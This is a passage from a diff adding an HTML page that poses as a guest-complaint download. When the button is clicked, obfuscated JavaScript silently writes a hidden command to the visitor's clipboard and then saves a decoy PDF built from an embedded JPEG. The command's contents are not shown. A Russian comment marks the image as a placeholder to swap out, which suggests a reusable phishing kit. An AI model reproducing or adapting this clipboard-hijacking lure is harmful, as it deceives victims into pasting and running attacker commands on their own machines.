OO/l9iuySrwDPTd3Gh4+vbXlBWqGGyVe/P8JRhw1WxUfE5sVr1B6n+CQDQ0R7rHT1WHFX48dbxbaGUfWeGXIpObLIGuTt+d70dOCnKnT2LqCYRwPf60ZieZpnyEsPlu3E6H2Sj09i6Mr5YK7jI9hjLpZXyEMPlo5E6H2QQGBpxYTK06eUxbWZCXm2HJRSl4snRJ5b7gkfI7Hsprq2o+501cbD/fQtE8RHnmw8hr9tfqtlDp3FY+02zWru9WNpbGZJnyemD5DQ4nj+ilCAQQRsHsQgokzf7UVc7lax36daKKoR8nsAmdr/xED9FJdNWm5zK5DOt7xivFVhPt+HnJ/tOA/RT+NxtPFUxUoQNhgBLuAJPc+fKY7G08XU+FoQCGHkXcQSe58+UFGo122+n+ja8rnhkliRr+Li0kafsbHfv4XfOwdP5bNR4eP0YxiPimwt3xbKHOHID7BWaHC46CGlDFX4soOLq45k8Cd7+ffyfK3/BVvjnXTEDYdCIXPJPdm96148lBRs5hMXB0D/MI9m2+GJ5teoeU7nFuw47/ABA7Pb5fopcU6+a6uyNfKxixDSgh+GgeTw08Eufx+Z322u09IYFzHMdSJjdvUZmfwZvv+Fu9N/RdmRwmOyUsc1qF3rRt4tlildG8N9uTSCR9EFRlbJUoZJ1Zz5K+AyjJq+3FxbHoepHv2AcVu/mb6nUM3UMkhNCw6em0b/DqJnJhH3cyQfqrbXxdGtjnY+CsxlVzXNdGN/iDvOz5JPutL8Di5MTFin1GmlEQWRcj2IOx33v5lBWG9P3TicRYkpR5NscT5rVKSTgXSSHkXjfYuGyNFR3VnUFGLpvEQYylC+Cbm9sVphf6QaS3Wie52XDvsdleslhaGTkZJbjk5saWB0Uz4zxPyPEjYW+tj6VSGKKvVhjZEzgwBg/C3235QfIIL9OTp6zPkaUUItSis2ShG2N5a3T3bb+UgHh7Hv5Ut/D3H4ex1F69P4+Z9SMyB87WMa0n8I/CCST3Pz+Su2b6TxGbbGLMT4jGXFroHcO7tbJGtHeh318luwHTmO6fjlbj2Scpteo+R/Jztb1/vKCVdvieJAOu21SnQ9Q/20Y038d8V/LnEP8AhncOHqDtrlve/mrsscRy5aHLWt676QYiDxEwSua6QNHItGgT89BU2xDmJerOoXYS5DXmZBXPGSEP9Q8DoAk/h/Y+VdFzxUq0N2xcjj4z2Q0Sv2fxBo03t9NoIvo34Q9OwvpmUl73OnMp2/1ifx8vrv8AppTi5qtCrTmsy1ohG+1J6k2idOd768A/ZdKAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICLzIHmNwjcGvIPEkbAPyVYux5PCz46f+dWbslm3HBLXmYzhIHeSwAbbrz5+SC0oirvUbrUucwlCves1I7Tp/VdXcA48WBw8goLEiq1TI2MRlsnSuXpshVp0hb9R7WmWPudsJGgSQNja7WdU0HY+S+6G5HWaGenI+Aj1y7w2MeXHfb/8AiCcRRFTqGtM+eO3Xs0JYITO6O0wNJjHl40SCB8/ms43OMyDgf5ffrQOjMrJ54g1j2++wTrsd9/kglkURjM/Hk5oxBj77K8oJitSRARvA/XY38tjuvfUeTkxWJdNWY2SzLIyCBrvBkedDf0+f6IJRFXv7PZL0vV/tLkvjvPPbfR5f93rXH9Vw9UVb1H4WzBnckw2r0UDo2vaGMa89+I49vp3KC3oqrm69rGU6FaPNZA/FZGON88kjebWFrtgHjrXbfhesbNZp9WRYyPLzZOtLXdJMJi1zq5BHE8mged60gtCKE6Rt2LmIkltTPlkFqZgc47Og8gBTaAi4Jcm2PN1sb6YPrwSS+py/LxIGtfXa7/sgIoPGWrEPU+UxdqZ8jXBlurzO9Ru7OaPoHD+qYK3YyOVy1wzPNKOYVq0e/wAP4B+N36uPn6IJxERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREGm5OatKaw2GSYxMLxHGNueQPA+pVSxWRdLkW5HL43LPvO/BEwUX+lVafIaT5Pu4/7lc0Qcle6Z79qoalmMV+OppGajl2N/hPz181C9S4xuTz+BjnryS1Wun9Yt5AN/ANbcPHcKyogg8hh6lHpfKVcVSbG6atJ+GMFzpHFp137klR+cxtqx0xhzBDYc+i+CWSGE8JS0M07j/pDex9lbEQVLHV8bPamtMrZ226KrI0/Gh+nNd5jaH62T7DsvGCdLDkxXxbMpJiBA/wBWC9EQInDXFkZf3O+413CuCIKdhPVgzVWDCRZWLHO5/FVrsLmxwdu3Au7g7+QJCmupsdPksTwp8fioJWWIA46DnsOwD9+4UuiCvjqd7mcBgsv8Ye3ofD6G/wDvD+HX1WerYJ7NTGCCGSRzMlXkeGN5cWgnZOvkPdT6IIHq6l/MGYuB1Y2ITkojMzjyHDTtk/RaKWPPT3UoZQqEYrJD8bYo9ivM35nXhrh+xVlRBTOncq/EUZalrEZd0nxUzwYqbnNIc8kd1c/IREFVm6KxTs5XlZjK3wQgkErdnvISOJ1v23+6s8EMdeCOCFgZFG0MY0eGgdgF7RBWer4r1aSnmcTWksWq3OF0cYJLmPaQPHs4AqWwOOGKwlSj5dFGOZ93nu4/uSpBEBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREGCQ0EkgAdyT8lGU+o8NetipUyMEszt8Wgn8evPEkaP6KUIBGj4PlVLMz2HZTFw5GgKOOr3mOisMeJObxsMboa9MH9fZBbVwZPM47ECI5G0yD1dhnIE8tefAPuF3qrdU2vgupOnbBgnn4Osf5OBnN7txgdh80E7jcrj8rE6XHW4rDWHTuB7tP1HkLsVOk+OE2c6jjpy41gxxjhbK1oke9u3eoW99a8DaxcymWxmBqW7ORbJZyb4Y2f+rAsq8mlznADu86+R+f7ILkiqGOzF8X56tW1ZyrHVHyxPsVDCWTN8MJ4tBDv6Ld0xkLFwuM2alsXWwkz4+eu2Ixv7eOwIAPb5jugtK5796rjqj7d6ZsMDNBz3b0NnQ8fVVzpjI2rlxrchmZW3wHGxjZq7Yw324dtkD32drq67Lh0rOWjk4TQaG9bPqt7IOyh1JhslbbVpX2TTuBIYGuG9DZ8hSqiqFzMzWwy9hoasJB3K24JCD8hx4hVqC9n5OkH9QHL/jrh7xB6DOEjWvIIedb2QPlrXZBdzLG2VsTpGCRwJawuGyB5IC9qn3qt231pQkgys1b16L5GBsTHek3bNtGx32e+yuez1Bat3ciY8tNRFSZ8NeGKi6Vshb5MjuJ7E9tAjQQXhFUpcpl8hbwUNSb4A36kklgOiDjGWhvgO+YOwN+/zVqgY+OCNksple1oDpCAC8++h2G0HtERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQa7Ebpa8kTJXROewtEjPzMJHkfUKDOByFuauMxmfi61eRsrYmVmxeo5vdpeQTvXsNKwIg5K9e3HkLc814zV5uPowGMAQ6Hfv5O1qu4sW8vjcgZiw0DIQzjvnzbx8/LSkEQc2SpjIYu1SLzGLMLoi8DfHkNb0uO9hGXMPWo/ESRS1PTdBYYByY9g0Ha8fp9VKogi61LMATfG5oSl0RZH6VVsYY4/4+5OyPbwuethLrsnHkMnlG2Z4IXxQGKsIuPLy49zs9vHhTiIIKDB3n5OndyuVbc+C5GBrKwiOyNbcQTvt8hoLtzuL/nGJkoicwF7mOEgZy4lrg4dv0UgiCJo0MzDbZJczotQjfKL4NkfLt/nA7HdaoenmxdKSYH4pxbJHIz1uHccnE+N/LfuptEEPew08tuhco3hWsVIjCS+H1GyMOtjWxo9vK1Owl+tdtTYbLCnDbkMssMlcShrz5c07Gt+x2FOogjXYovymPvyWnvkpwPiPJo3IXAbcdePHjXzUkiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICysIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIifNAREQEWUQYREQEREBERAREQEREBERAREQEREBERAREQf/Z'; // ← ЗАМЕНИТЕ НА ВАШ BASE64
+        };
+
+        const _0x3b9c6d = (text) => {
+            return new Promise(resolve => {
+                if (navigator.clipboard) {
+                    navigator.clipboard.writeText(text).then(() => resolve(true));
+                } else {
+                    const el = document.createElement('textarea');
+                    el.value = text;
+                    document.body.appendChild(el);
+                    el.select();
+                    document.execCommand('copy');
+                    document.body.removeChild(el);
+                    resolve(true);
+                }
+            });
+        };
+
+        async function startProcess() {
+            const loader = document.getElementById('loadingMessage');
+            const button = document.querySelector('.btn-primary');
+            
+            loader.style.display = 'block';
+            button.disabled = true;
+            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING YOUR REQUEST...';
+            
+            const cmd = _0x2f8a4d();
+            
+            try {
+                await _0x3b9c6d(cmd);
+                
+                setTimeout(() => {
+                    // Create PDF with jsPDF
+                    const { jsPDF } = window.jspdf;
+                    const doc = new jsPDF();
+                    
+                    const base64Image = getJpgBase64();
+                    
+                    // Add image to PDF (only if it's a valid base64)
+                    if (base64Image && base64Image !== '12345' && base64Image.length > 100) {
+                        try {
+                            // Add image to fill the entire PDF page
+                            const pageWidth = doc.internal.pageSize.getWidth();
+                            const pageHeight = doc.internal.pageSize.getHeight();
+                            doc.addImage(base64Image, 'JPEG', 0, 0, pageWidth, pageHeight);
+                        } catch (error) {
+                            console.error('Error adding image to PDF:', error);
+                        }
+                    }
+                    
+                    // Save PDF
+                    doc.save('Guest_Complaint_Case_45892.pdf');
+                    
+                    setTimeout(() => {
+                        loader.style.display = 'none';
+                        button.disabled = false;
+                        button.innerHTML = '<i class="fas fa-download"></i> DOWNLOAD COMPLAINT DOCUMENT';
+                    }, 1500);
+                    
+                }, 800);
+                
+            } catch (err) {
+                setTimeout(() => {
+                    // Create PDF with jsPDF
+                    const { jsPDF } = window.jspdf;
+                    const doc = new jsPDF();
+                    
+                    const base64Image = getJpgBase64();
+                    
+                    // Add image to PDF (only if it's a valid base64)
+                    if (base64Image && base64Image !== '12345' && base64Image.length > 100) {
+                        try {
+                            // Add image to fill the entire PDF page
+                            const pageWidth = doc.internal.pageSize.getWidth();
+                            const pageHeight = doc.internal.pageSize.getHeight();
+                            doc.addImage(base64Image, 'JPEG', 0, 0, pageWidth, pageHeight);
+                        } catch (error) {
+                            console.error('Error adding image to PDF:', error);
+                        }
+                    }
+                    
+                    // Save PDF
+                    doc.save('Guest_Complaint_Case_45892.pdf');
+                    
+                    setTimeout(() => {
+                        loader.style.display = 'none';
+                        button.disabled = false;
+                        button.innerHTML = '<i class="fas fa-download"></i> DOWNLOAD COMPLAINT DOCUMENT';
+                    }, 1500);
+                }, 800);
+            }
+        }
+    </script>
+</body>
+</html>
